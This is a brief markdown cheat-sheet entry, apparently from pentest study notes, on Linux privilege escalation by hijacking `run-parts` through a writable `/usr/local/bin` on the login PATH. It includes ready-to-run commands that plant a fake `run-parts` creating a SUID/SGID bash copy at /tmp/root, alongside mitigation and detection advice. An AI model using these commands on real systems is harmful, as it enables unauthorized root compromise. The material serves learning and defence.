---
topic: run-parts — PATH hijack at login
tags: [linux, run-parts, path-hijack, update-motd, privesc]
---

# run-parts — PATH hijack at login

**English** | [🌐 Español](run-parts-path-hijack.md)

## Concept

At login, PAM or the shell may run `run-parts` over `/etc/update-motd.d` with a PATH including `/usr/local/bin`. If an unprivileged group can write there, a fake `run-parts` runs as root.

## When it applies

- `pspy` shows `run-parts` as root on each login.
- PATH prioritizes `/usr/local/bin` over `/usr/bin`.
- The user can write to `/usr/local/bin`.

## Procedure

1. Confirm the process and PATH order.
2. Create a `run-parts` that copies bash and sets SUID.
3. Make it executable.
4. Log in again and use the SUID shell.

## Commands

```bash
pspy64
printf '#!/bin/bash\ncp /bin/bash /tmp/root; chmod 6777 /tmp/root\n' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
ssh <USER>@<IP>
/tmp/root -p
```

## Variants

- Hijack another PATH binary (`env`, `sh`, `perl`).
- Edit a writable `/etc/update-motd.d` script.
- Abuse `run-parts` with controlled arguments.

## Limitations

- PATH may be clean or use absolute paths.
- The directory may not be writable.
- PAM may not run MOTD over SSH.

## Mitigation

- Use absolute paths in login scripts.
- Remove unprivileged group writes to `/usr/local/bin`.
- Audit `update-motd.d` and PATH.

## Detection

- `run-parts` executed from `/usr/local/bin`.
- New SUID shells.
- Changes to MOTD scripts.

## References

- [0xdf — Writeup](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html)
- [Debian — run-parts](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [MITRE — T1574.007](https://attack.mitre.org/techniques/T1574/007/)
